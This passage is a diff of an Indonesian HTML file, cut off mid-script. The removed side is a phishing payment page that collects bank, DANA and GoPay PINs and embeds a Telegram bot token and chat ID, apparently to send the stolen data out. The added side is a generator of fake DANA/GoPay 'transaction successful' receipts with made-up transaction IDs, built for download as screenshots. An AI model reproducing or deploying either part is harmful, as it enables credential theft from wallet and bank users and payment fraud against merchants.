@@ -1,118 +1,546 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Payment Gateway - Bank, Dana & GoPay</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Transfer DANA</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        /* Semua CSS yang sama tetap dipertahankan */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', Arial, sans-serif;
+        }
+        
+        :root {
+            --dana-blue: #00a2ff;
+            --dana-dark: #0088cc;
+            --gopay-green: #00aa13;
+            --text-primary: #1a1a1a;
+            --text-secondary: #666666;
+            --text-light: #999999;
+            --background: #f8f9fa;
+            --card-bg: #ffffff;
+            --border: #e8e8e8;
+            --success: #00c853;
+            --divider: #f0f0f0;
         }
         
         body {
-            background: linear-gradient(135deg, #1a2a6c 0%, #b21f1f 50%, #fdbb2d 100%);
-            color: #333;
-            line-height: 1.6;
+            background: #e8ecef;
             min-height: 100vh;
             display: flex;
-            flex-direction: column;
-            align-items: center;
             justify-content: center;
+            align-items: center;
             padding: 20px;
         }
         
-        .container {
-            width: 100%;
-            max-width: 500px;
-            background: white;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        .phone-mockup {
+            width: 375px;
+            height: 812px;
+            background: #000;
+            border-radius: 44px;
+            padding: 14px;
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.4);
+            position: relative;
             overflow: hidden;
         }
         
-        header {
-            background: #2c3e50;
-            color: white;
-            padding: 25px;
-            text-align: center;
+        .screen {
+            width: 100%;
+            height: 100%;
+            background: #ffffff;
+            border-radius: 36px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
             position: relative;
         }
         
-        .logo {
-            position: absolute;
-            top: 15px;
-            left: 20px;
-            font-size: 24px;
-            color: #3498db;
-        }
-        
-        h1 {
-            font-size: 28px;
-            margin-bottom: 10px;
-        }
-        
-        .subtitle {
-            font-size: 16px;
-            opacity: 0.8;
-        }
-        
-        .content {
-            padding: 30px;
-        }
-        
-        .payment-methods {
+        .status-bar {
+            height: 44px;
+            background: var(--dana-blue);
             display: flex;
             justify-content: space-between;
-            margin-bottom: 20px;
-            gap: 10px;
+            align-items: center;
+            padding: 0 20px;
+            color: white;
+            font-size: 15px;
+            font-weight: 600;
+            position: relative;
+            z-index: 100;
         }
         
-        .payment-method {
+        .status-left {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .status-right {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .notch {
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 210px;
+            height: 32px;
+            background: #000;
+            border-bottom-left-radius: 24px;
+            border-bottom-right-radius: 24px;
+            z-index: 90;
+        }
+        
+        .content-area {
             flex: 1;
-            padding: 15px;
-            border: 2px solid #ddd;
-            border-radius: 10px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s;
+            overflow-y: auto;
+            background: var(--background);
+            position: relative;
         }
         
-        .payment-method.active {
-            border-color: #3498db;
-            background-color: #e8f4fc;
-            transform: translateY(-5px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        .bottom-nav {
+            height: 84px;
+            background: white;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            border-top: 1px solid var(--border);
+            padding: 8px 20px 24px;
+            position: relative;
         }
         
-        .payment-method i {
-            font-size: 30px;
-            margin-bottom: 10px;
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: var(--text-light);
+            font-size: 11px;
+            gap: 6px;
+            flex: 1;
         }
         
-        .bank-icon {
-            color: #2c3e50;
+        .nav-item.active {
+            color: var(--dana-blue);
         }
         
-        .dana-icon {
-            color: #118eea;
+        .nav-icon {
+            font-size: 22px;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
         
-        .gopay-icon {
-            color: #00aae7;
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
+        .page {
             display: none;
+            height: 100%;
+            flex-direction: column;
         }
         
-        .form-group.active {
+        .page.active {
+            display: flex;
+        }
+        
+        /* HEADER STYLES */
+        .header {
+            background: var(--dana-blue);
+            color: white;
+            padding: 12px 20px;
+            text-align: center;
+            position: relative;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        
+        .header.gopay {
+            background: var(--gopay-green);
+        }
+        
+        .header-title {
+            font-size: 17px;
+            font-weight: 700;
+            letter-spacing: -0.2px;
+        }
+        
+        .back-btn {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: white;
+            font-size: 20px;
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 8px;
+        }
+        
+        /* TRANSACTION CARD STYLES */
+        .transaction-card {
+            background: white;
+            margin: 16px;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+        }
+        
+        .card-section {
+            padding: 20px;
+            border-bottom: 1px solid var(--divider);
+        }
+        
+        .card-section:last-child {
+            border-bottom: none;
+        }
+        
+        .transaction-date {
+            color: var(--text-secondary);
+            font-size: 14px;
+            margin-bottom: 16px;
+            font-weight: 500;
+        }
+        
+        .recipient-info {
+            margin-bottom: 4px;
+        }
+        
+        .recipient-number {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: var(--text-primary);
+            letter-spacing: -0.2px;
+        }
+        
+        .transaction-status {
+            color: var(--success);
+            font-weight: 700;
+            margin-bottom: 6px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 15px;
+        }
+        
+        .merchant-name {
+            color: var(--text-secondary);
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .total-section {
+            text-align: center;
+            padding: 24px 20px;
+        }
+        
+        .total-label {
+            color: var(--text-secondary);
+            font-size: 14px;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        
+        .total-amount {
+            font-size: 28px;
+            font-weight: 800;
+            color: var(--text-primary);
+            letter-spacing: -0.5px;
+        }
+        
+        .payment-section h3 {
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin-bottom: 12px;
+            font-weight: 500;
+        }
+        
+        .payment-detail {
+            font-size: 16px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .payment-icon {
+            width: 28px;
+            height: 28px;
+            background: var(--dana-blue);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 14px;
+        }
+        
+        .payment-icon.gopay {
+            background: var(--gopay-green);
+        }
+        
+        .detail-title {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 16px;
+            color: var(--text-primary);
+        }
+        
+        .divider {
+            height: 1px;
+            background: var(--divider);
+            margin: 16px 0;
+        }
+        
+        .ad-container {
+            background: #f8f9fa;
+            padding: 16px;
+            border-radius: 12px;
+            margin: 16px 0;
+            border: 1px solid #e8e8e8;
+        }
+        
+        .ad-title {
+            font-weight: 700;
+            margin-bottom: 6px;
+            font-size: 15px;
+            color: var(--text-primary);
+        }
+        
+        .ad-description {
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin-bottom: 12px;
+            line-height: 1.4;
+        }
+        
+        .ad-source {
+            font-size: 12px;
+            color: var(--text-light);
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        
+        .share-section {
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .share-button {
+            background: var(--dana-blue);
+            color: white;
+            border: none;
+            padding: 16px 24px;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 16px;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 2px 8px rgba(0, 162, 255, 0.3);
+        }
+        
+        .share-button.gopay {
+            background: var(--gopay-green);
+            box-shadow: 0 2px 8px rgba(0, 170, 19, 0.3);
+        }
+        
+        .share-button:active {
+            transform: scale(0.98);
+            box-shadow: 0 1px 4px rgba(0, 162, 255, 0.3);
+        }
+        
+        .share-button.gopay:active {
+            box-shadow: 0 1px 4px rgba(0, 170, 19, 0.3);
+        }
+        
+        /* INPUT PAGE STYLES */
+        .input-container {
+            padding: 24px 20px;
+            background: white;
+            margin: 16px;
+            border-radius: 16px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-label {
             display: block;
-            animation: fadeIn 0.5s;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 16px;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            background: white;
+            transition: all 0.2s ease;
+            font-weight: 500;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: var(--dana-blue);
+            box-shadow: 0 0 0 3px rgba(0, 162, 255, 0.1);
+        }
+        
+        .select-field {
+            width: 100%;
+            padding: 16px;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            background: white;
+            transition: all 0.2s ease;
+            font-weight: 500;
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 16px center;
+            background-size: 16px;
+        }
+        
+        .select-field:focus {
+            outline: none;
+            border-color: var(--dana-blue);
+            box-shadow: 0 0 0 3px rgba(0, 162, 255, 0.1);
+        }
+        
+        .primary-button {
+            background: var(--dana-blue);
+            color: white;
+            border: none;
+            padding: 18px 24px;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 16px;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 2px 8px rgba(0, 162, 255, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .primary-button:active {
+            transform: scale(0.98);
+            box-shadow: 0 1px 4px rgba(0, 162, 255, 0.3);
+        }
+        
+        /* SCREENSHOT PAGE STYLES */
+        .screenshot-page {
+            padding: 24px 20px;
+            text-align: center;
+        }
+        
+        .success-indicator {
+            width: 80px;
+            height: 80px;
+            background: var(--success);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            color: white;
+            font-size: 32px;
+            box-shadow: 0 4px 12px rgba(0, 200, 83, 0.3);
+        }
+        
+        .success-title {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: var(--success);
+        }
+        
+        .success-subtitle {
+            font-size: 15px;
+            color: var(--text-secondary);
+            margin-bottom: 32px;
+        }
+        
+        .screenshot-preview {
+            width: 100%;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+            margin-bottom: 24px;
+            border: 1px solid var(--border);
+            background: white;
+        }
+        
+        .download-button {
+            background: var(--success);
+            color: white;
+            border: none;
+            padding: 18px 24px;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 16px;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 2px 8px rgba(0, 200, 83, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+        
+        .download-button:active {
+            transform: scale(0.98);
+            box-shadow: 0 1px 4px rgba(0, 200, 83, 0.3);
+        }
+        
+        .secondary-button {
+            background: transparent;
+            color: var(--dana-blue);
+            border: 2px solid var(--dana-blue);
+            padding: 16px 24px;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 16px;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .secondary-button:active {
+            background: rgba(0, 162, 255, 0.1);
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+        
+        .fade-in {
+            animation: fadeIn 0.3s ease;
         }
         
         @keyframes fadeIn {
@@ -120,358 +548,441 @@
             to { opacity: 1; transform: translateY(0); }
         }
         
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            color: #2c3e50;
+        /* SCROLLBAR STYLING */
+        .content-area::-webkit-scrollbar {
+            width: 4px;
         }
         
-        select, input {
-            width: 100%;
-            padding: 14px;
-            border: 2px solid #ddd;
-            border-radius: 8px;
-            font-size: 16px;
-            transition: border-color 0.3s;
+        .content-area::-webkit-scrollbar-track {
+            background: transparent;
         }
         
-        select:focus, input:focus {
-            border-color: #3498db;
-            outline: none;
+        .content-area::-webkit-scrollbar-thumb {
+            background: #ddd;
+            border-radius: 2px;
         }
         
-        input[type="password"] {
-            letter-spacing: 4px;
-            font-weight: bold;
+        /* DANA SPECIFIC STYLES */
+        .dana-logo {
+            font-weight: 800;
+            letter-spacing: -0.5px;
         }
         
-        .btn {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(to right, #3498db, #2980b9);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 18px;
-            cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-        }
-        
-        .btn-telegram {
-            background: linear-gradient(to right, #0088cc, #006da3);
-            margin-top: 15px;
-        }
-        
-        .btn-verify {
-            background: linear-gradient(to right, #4CAF50, #2E7D32);
-        }
-        
-        .disclaimer {
-            margin-top: 25px;
-            padding: 15px;
-            background-color: #f8f9fa;
-            border-radius: 8px;
-            font-size: 14px;
-            color: #6c757d;
-            border-left: 4px solid #3498db;
-        }
-        
-        footer {
+        .transaction-id {
+            font-size: 12px;
+            color: var(--text-light);
             text-align: center;
-            padding: 20px;
-            background: #f8f9fa;
-            color: #6c757d;
-            font-size: 14px;
-        }
-        
-        .notification {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            padding: 15px 20px;
-            background: #4CAF50;
-            color: white;
-            border-radius: 8px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            transform: translateX(150%);
-            transition: transform 0.3s ease-out;
-            z-index: 1000;
-        }
-        
-        .notification.show {
-            transform: translateX(0);
-        }
-        
-        .notification.error {
-            background: #f44336;
-        }
-        
-        @media (max-width: 600px) {
-            .container {
-                margin: 10px;
-            }
-            
-            .content {
-                padding: 20px;
-            }
-            
-            .payment-methods {
-                flex-direction: column;
-            }
+            margin-top: 8px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <div class="logo">
-                <i class="fas fa-money-bill-wave"></i>
-            </div>
-            <h1>Payment Gateway</h1>
-            <p class="subtitle">Pilih metode pembayaran Anda</p>
-        </header>
-        
-        <div class="content">
-            <div class="payment-methods">
-                <div class="payment-method active" data-method="bank">
-                    <i class="fas fa-university bank-icon"></i>
-                    <div>Transfer Bank</div>
+    <div class="phone-mockup">
+        <div class="notch"></div>
+        <div class="screen">
+            <div class="status-bar">
+                <div class="status-left">
+                    <span id="currentTime">11:35</span>
                 </div>
-                <div class="payment-method" data-method="dana">
-                    <i class="fas fa-wallet dana-icon"></i>
-                    <div>DANA</div>
-                </div>
-                <div class="payment-method" data-method="gopay">
-                    <i class="fas fa-mobile-alt gopay-icon"></i>
-                    <div>GoPay</div>
+                <div class="status-right">
+                    <i class="fas fa-signal"></i>
+                    <i class="fas fa-wifi"></i>
+                    <i class="fas fa-battery-three-quarters"></i>
                 </div>
             </div>
             
-            <form id="paymentForm">
-                <!-- Form untuk Bank -->
-                <div class="form-group active" id="bank-form">
-                    <label for="bankSelect">Pilih Bank:</label>
-                    <select id="bankSelect" required>
-                        <option value="">-- Pilih Bank --</option>
-                        <option value="bca">BCA (Bank Central Asia)</option>
-                        <option value="bni">BNI (Bank Negara Indonesia)</option>
-                        <option value="bri">BRI (Bank Rakyat Indonesia)</option>
-                        <option value="mandiri">Bank Mandiri</option>
-                        <option value="cimb">CIMB Niaga</option>
-                        <option value="danamon">Bank Danamon</option>
-                    </select>
+            <div class="content-area">
+                <!-- INPUT PAGE -->
+                <div class="page active" id="inputPage">
+                    <div class="header">
+                        <h1 class="header-title">Transfer DANA/GoPay</h1>
+                    </div>
                     
-                    <label for="accountNumber">Nomor Rekening:</label>
-                    <input type="text" id="accountNumber" placeholder="Masukkan nomor rekening" required>
-                    
-                    <label for="bankPin">PIN Bank:</label>
-                    <input type="password" id="bankPin" placeholder="Masukkan PIN bank" maxlength="6" required>
+                    <div class="input-container">
+                        <div class="input-group">
+                            <label class="input-label" for="paymentMethod">Metode Pembayaran</label>
+                            <select id="paymentMethod" class="select-field">
+                                <option value="dana">DANA</option>
+                                <option value="gopay">GoPay</option>
+                            </select>
+                        </div>
+                        
+                        <div class="input-group">
+                            <label class="input-label" for="nomor">Nomor Penerima</label>
+                            <input type="text" id="nomor" class="input-field" placeholder="Contoh: 0895•••••9051" value="0895•••••9051">
+                        </div>
+                        
+                        <div class="input-group">
+                            <label class="input-label" for="nama">Nama Penerima</label>
+                            <input type="text" id="nama" class="input-field" placeholder="Contoh: Toko Wpulsa" value="Toko Wpulsa">
+                        </div>
+                        
+                        <div class="input-group">
+                            <label class="input-label" for="jumlah">Jumlah Transfer (Rp)</label>
+                            <input type="text" id="jumlah" class="input-field" placeholder="Contoh: 156.000" value="156.000">
+                        </div>
+                        
+                        <button class="primary-button" id="generateBtn">
+                            <i class="fas fa-bolt"></i>
+                            Buat Tampilan Transfer
+                        </button>
+                    </div>
                 </div>
                 
-                <!-- Form untuk DANA -->
-                <div class="form-group" id="dana-form">
-                    <label for="danaNumber">Nomor Telepon DANA:</label>
-                    <input type="text" id="danaNumber" placeholder="Masukkan nomor DANA" required>
+                <!-- TRANSFER PAGE -->
+                <div class="page" id="transferPage">
+                    <div class="header" id="transferHeader">
+                        <button class="back-btn" id="backFromTransfer">
+                            <i class="fas fa-arrow-left"></i>
+                        </button>
+                        <h1 class="header-title" id="transferTitle">BISNIS</h1>
+                    </div>
                     
-                    <label for="danaPin">PIN DANA:</label>
-                    <input type="password" id="danaPin" placeholder="Masukkan PIN DANA" maxlength="6" required>
+                    <div class="transaction-card">
+                        <div class="card-section">
+                            <div class="transaction-date" id="dateInfo">18 Sep 2025 • 11:35</div>
+                            <div class="recipient-info">
+                                <div class="recipient-number" id="recipientNumber">ID DANA 0895•••••9051</div>
+                                <div class="transaction-status">
+                                    <i class="fas fa-check-circle"></i>
+                                    Transaksi berhasil!
+                                </div>
+                                <div class="merchant-name" id="merchantName">- Pembayaran ke Toko Wpulsa</div>
+                            </div>
+                        </div>
+                        
+                        <div class="card-section total-section">
+                            <div class="total-label">Total Bayar</div>
+                            <div class="total-amount" id="totalAmount">Rp156.000</div>
+                        </div>
+                        
+                        <div class="card-section payment-section">
+                            <h3>Metode Pembayaran</h3>
+                            <div class="payment-detail">
+                                <div class="payment-icon" id="paymentIcon">
+                                    <i class="fas fa-wallet"></i>
+                                </div>
+                                <span id="paymentMethodText">Saldo DANA</span>
+                            </div>
+                        </div>
+                        
+                        <div class="card-section">
+                            <div class="detail-title">Detail Transaksi</div>
+                            <div class="divider"></div>
+                            
+                            <div class="ad-container">
+                                <div class="ad-title">Dapatkan $5 per jawaban</div>
+                                <div class="ad-description">Hasilkan uang dari menjawab pertanyaan sederhana. Kami membayar Anda secara tunai.</div>
+                                <div class="ad-source">
+                                    <i class="fas fa-info-circle"></i> 0 • Iklan oleh Google
+                                </div>
+                            </div>
+                            
+                            <div class="divider"></div>
+                            <div class="transaction-id" id="transactionId">ID Transaksi: DANA2025092911350895</div>
+                        </div>
+                    </div>
+                    
+                    <div class="share-section">
+                        <button class="share-button" id="screenshotBtn">
+                            <i class="fas fa-camera"></i>
+                            AMBIL SCREENSHOT
+                        </button>
+                    </div>
                 </div>
                 
-                <!-- Form untuk GoPay -->
-                <div class="form-group" id="gopay-form">
-                    <label for="gopayNumber">Nomor Telepon GoPay:</label>
-                    <input type="text" id="gopayNumber" placeholder="Masukkan nomor GoPay" required>
+                <!-- SCREENSHOT PAGE -->
+                <div class="page" id="screenshotPage">
+                    <div class="header">
+                        <button class="back-btn" id="backFromScreenshot">
+                            <i class="fas fa-arrow-left"></i>
+                        </button>
+                        <h1 class="header-title">Screenshot</h1>
+                    </div>
                     
-                    <label for="gopayPin">PIN GoPay:</label>
-                    <input type="password" id="gopayPin" placeholder="Masukkan PIN GoPay" maxlength="6" required>
+                    <div class="screenshot-page">
+                        <div class="success-indicator">
+                            <i class="fas fa-check"></i>
+                        </div>
+                        <div class="success-title">Screenshot Berhasil!</div>
+                        <div class="success-subtitle">Gambar siap untuk diunduh</div>
+                        
+                        <canvas id="screenshotPreview" class="screenshot-preview"></canvas>
+                        
+                        <button class="download-button" id="downloadBtn">
+                            <i class="fas fa-download"></i>
+                            Download Screenshot
+                        </button>
+                        
+                        <button class="secondary-button" id="newTransferBtn">
+                            <i class="fas fa-plus"></i>
+                            Buat Transfer Baru
+                        </button>
+                    </div>
                 </div>
-                
-                <label for="userPin">PIN Anda:</label>
-                <input type="password" id="userPin" placeholder="Masukkan PIN Anda" maxlength="6" required>
-                
-                <button type="button" id="verifyBtn" class="btn btn-verify">
-                    <i class="fas fa-check-circle"></i> Verifikasi & Lanjutkan Pembayaran
-                </button>
-            </form>
+            </div>
             
-            <div class="disclaimer">
-                <strong>Perhatian:</strong> Pastikan informasi yang Anda masukkan benar. Kami tidak menyimpan data PIN Anda.
+            <div class="bottom-nav">
+                <div class="nav-item">
+                    <div class="nav-icon"><i class="fas fa-home"></i></div>
+                    <div>Home</div>
+                </div>
+                <div class="nav-item">
+                    <div class="nav-icon"><i class="fas fa-tag"></i></div>
+                    <div>Promo</div>
+                </div>
+                <div class="nav-item active">
+                    <div class="nav-icon"><i class="fas fa-qrcode"></i></div>
+                    <div>Bayar</div>
+                </div>
+                <div class="nav-item">
+                    <div class="nav-icon"><i class="fas fa-inbox"></i></div>
+                    <div>Inbox</div>
+                </div>
+                <div class="nav-item">
+                    <div class="nav-icon"><i class="fas fa-ellipsis-h"></i></div>
+                    <div>Lainnya</div>
+                </div>
             </div>
         </div>
-        
-        <footer>
-            <p>&copy; 2023 Payment Gateway. Semua hak dilindungi.</p>
-        </footer>
     </div>
 
-    <div class="notification" id="notification">
-        <i class="fas fa-check-circle"></i>
-        <span id="notification-text">Data berhasil dikirim!</span>
-    </div>
+    <!-- HIDDEN CONTAINER FOR SCREENSHOT -->
+    <div id="screenshotContainer" style="position: fixed; top: -9999px; left: -9999px; width: 375px; background: #f8f9fa;"></div>
 
+    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
     <script>
-        // Token bot Telegram Anda
-        const BOT_TOKEN = "8021598214:AAF-6-530XLoDwvLLozV0Gs6Tz8ulFTW-ho";
-        const CHAT_ID = "6157377532"; // Chat ID yang Anda berikan
+        // Update waktu real-time
+        function updateTime() {
+            const now = new Date();
+            const timeStr = now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
+            document.getElementById('currentTime').textContent = timeStr;
+        }
         
-        // Variabel untuk menyimpan metode pembayaran yang dipilih
-        let selectedMethod = "bank";
+        setInterval(updateTime, 1000);
+        updateTime();
         
-        // Fungsi untuk mengubah metode pembayaran
-        document.querySelectorAll('.payment-method').forEach(method => {
-            method.addEventListener('click', function() {
-                // Hapus kelas active dari semua metode
-                document.querySelectorAll('.payment-method').forEach(m => {
-                    m.classList.remove('active');
-                });
-                
-                // Tambahkan kelas active ke metode yang dipilih
-                this.classList.add('active');
-                
-                // Sembunyikan semua form
-                document.querySelectorAll('.form-group').forEach(form => {
-                    form.classList.remove('active');
-                });
-                
-                // Tampilkan form yang sesuai
-                selectedMethod = this.getAttribute('data-method');
-                document.getElementById(`${selectedMethod}-form`).classList.add('active');
-            });
+        // Page elements
+        const inputPage = document.getElementById('inputPage');
+        const transferPage = document.getElementById('transferPage');
+        const screenshotPage = document.getElementById('screenshotPage');
+        let screenshotCanvas = null;
+        let currentPaymentMethod = 'dana';
+        
+        // Navigation buttons
+        document.getElementById('generateBtn').addEventListener('click', showTransferPage);
+        document.getElementById('backFromTransfer').addEventListener('click', showInputPage);
+        document.getElementById('screenshotBtn').addEventListener('click', takeScreenshot);
+        document.getElementById('backFromScreenshot').addEventListener('click', showTransferPage);
+        document.getElementById('newTransferBtn').addEventListener('click', showInputPage);
+        document.getElementById('downloadBtn').addEventListener('click', downloadScreenshot);
+        
+        // Payment method change
+        document.getElementById('paymentMethod').addEventListener('change', function() {
+            currentPaymentMethod = this.value;
         });
         
-        // Fungsi untuk verifikasi dan kirim data
-        document.getElementById('verifyBtn').addEventListener('click', function() {
-            const userPin = document.getElementById('userPin').value;
+        function showInputPage() {
+            inputPage.classList.add('active', 'fade-in');
+            transferPage.classList.remove('active');
+            screenshotPage.classList.remove('active');
+        }
+        
+        function showTransferPage() {
+            // Get input values
+            const nomor = document.getElementById('nomor').value || '0895•••••9051';
+            const nama = document.getElementById('nama').value || 'Toko Wpulsa';
+            let jumlah = document.getElementById('jumlah').value || '156.000';
             
-            if (!userPin) {
-                showNotification('Masukkan PIN Anda terlebih dahulu', true);
+            // Format amount to Indonesian currency
+            const formattedJumlah = 'Rp' + jumlah;
+            
+            // Update content based on payment method
+            updateTransferPage(currentPaymentMethod, nomor, nama, formattedJumlah);
+            
+            // Update date to current
+            const now = new Date();
+            const options = { day: 'numeric', month: 'short', year: 'numeric' };
+            const dateStr = now.toLocaleDateString('id-ID', options);
+            const timeStr = now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
+            document.getElementById('dateInfo').textContent = `${dateStr} • ${timeStr}`;
+            
+            // Show transfer page
+            inputPage.classList.remove('active');
+            transferPage.classList.add('active', 'fade-in');
+            screenshotPage.classList.remove('active');
+        }
+        
+        function updateTransferPage(method, nomor, nama, jumlah) {
+            const header = document.getElementById('transferHeader');
+            const title = document.getElementById('transferTitle');
+            const recipientNumber = document.getElementById('recipientNumber');
+            const paymentIcon = document.getElementById('paymentIcon');
+            const paymentMethodText = document.getElementById('paymentMethodText');
+            const screenshotBtn = document.getElementById('screenshotBtn');
+            const transactionId = document.getElementById('transactionId');
+            
+            if (method === 'dana') {
+                // Update for DANA
+                header.className = 'header';
+                title.textContent = 'BISNIS';
+                recipientNumber.textContent = `ID DANA ${nomor}`;
+                paymentIcon.className = 'payment-icon';
+                paymentMethodText.textContent = 'Saldo DANA';
+                screenshotBtn.className = 'share-button';
+                transactionId.textContent = `ID Transaksi: DANA${new Date().getFullYear()}${(new Date().getMonth()+1).toString().padStart(2, '0')}${new Date().getDate().toString().padStart(2, '0')}${new Date().getHours().toString().padStart(2, '0')}${new Date().getMinutes().toString().padStart(2, '0')}${nomor.slice(-4)}`;
+            } else {
+                // Update for GoPay
+                header.className = 'header gopay';
+                title.textContent = 'TRANSAKSI';
+                recipientNumber.textContent = `ID GoPay ${nomor}`;
+                paymentIcon.className = 'payment-icon gopay';
+                paymentMethodText.textContent = 'Saldo GoPay';
+                screenshotBtn.className = 'share-button gopay';
+                transactionId.textContent = `ID Transaksi: GOPAY${new Date().getFullYear()}${(new Date().getMonth()+1).toString().padStart(2, '0')}${new Date().getDate().toString().padStart(2, '0')}${new Date().getHours().toString().padStart(2, '0')}${new Date().getMinutes().toString().padStart(2, '0')}${nomor.slice(-4)}`;
+            }
+            
+            // Update common elements
+            document.getElementById('merchantName').textContent = `- Pembayaran ke ${nama}`;
+            document.getElementById('totalAmount').textContent = jumlah;
+        }
+        
+        function takeScreenshot() {
+            // Show loading state
+            const screenshotBtn = document.getElementById('screenshotBtn');
+            const originalText = screenshotBtn.innerHTML;
+            screenshotBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> MEMPROSES...';
+            screenshotBtn.disabled = true;
+            
+            // Create a clean copy for screenshot
+            const transferPageClone = transferPage.cloneNode(true);
+            const backBtn = transferPageClone.querySelector('#backFromTransfer');
+            if (backBtn) backBtn.remove();
+            
+            // Add to screenshot container
+            const screenshotContainer = document.getElementById('screenshotContainer');
+            screenshotContainer.innerHTML = '';
+            screenshotContainer.appendChild(transferPageClone);
+            
+            // Set explicit height for the cloned element
+            transferPageClone.style.height = 'auto';
+            transferPageClone.style.minHeight = '700px';
+            transferPageClone.style.overflow = 'visible';
+            
+            // Ensure all styles are applied
+            setTimeout(() => {
+                // Take screenshot
+                html2canvas(transferPageClone, {
+                    backgroundColor: '#f8f9fa',
+                    scale: 2,
+                    useCORS: true,
+                    logging: false,
+                    width: 375,
+                    height: transferPageClone.scrollHeight,
+                    windowWidth: 375,
+                    onclone: function(clonedDoc) {
+                        // Ensure all elements are visible
+                        const allElements = clonedDoc.querySelectorAll('*');
+                        allElements.forEach(el => {
+                            el.style.visibility = 'visible';
+                            el.style.opacity = '1';
+                        });
+                        
+                        // Ensure proper styling for the cloned page
